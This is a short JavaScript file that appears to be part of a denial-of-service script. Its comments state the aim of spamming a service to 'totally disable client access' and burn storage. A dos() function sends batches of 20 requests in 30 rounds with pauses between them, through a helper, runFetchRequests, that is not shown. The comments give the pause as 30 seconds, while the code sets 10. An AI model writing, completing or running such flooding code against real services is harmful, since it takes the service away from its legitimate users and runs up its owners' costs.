//constant spam to totally disable client access
//and burns alot of storage
//8000 requests (75% hit rate) = ~1mb data
const PAUSE_INTERVAL = 10;
const TOTAL_ITERATIONS = 30;
const FETCH_COUNT = 20;
async function dos() {
    const totalIterations = TOTAL_ITERATIONS;
    const interval = PAUSE_INTERVAL * 1000; // 30 seconds in milliseconds

    for (let i = 0; i < totalIterations; i++) {
        try {
            console.log(`Starting iteration ${i + 1}...`);
            await runFetchRequests(FETCH_COUNT);
            console.log(`Completed iteration ${i + 1}`);
        } catch (error) {
            console.error(`Error in iteration ${i + 1}:`, error);
        }

        // Wait for 30 seconds before the next iteration
        if (i < totalIterations - 1) {
            await new Promise(resolve => setTimeout(resolve, interval));
        }
    }
}

dos();
